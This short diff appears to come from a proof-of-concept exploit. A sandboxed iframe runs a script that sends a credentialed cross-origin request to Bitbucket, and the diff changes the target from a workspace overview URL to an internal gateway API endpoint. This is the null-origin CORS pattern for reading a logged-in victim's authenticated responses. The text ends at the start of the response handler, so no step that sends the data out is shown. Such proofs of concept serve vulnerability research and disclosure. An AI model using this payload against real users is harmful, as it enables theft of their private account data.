@@ -1,7 +1,7 @@
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','bitbucket.org/iamnabil23/workspace/overview/?state=section',true);
+    req.open('get','bitbucket.org/gateway/api/gasv3/api/v1/batch',true);
     req.withCredentials = true;
     req.send();
     function reqListener() {
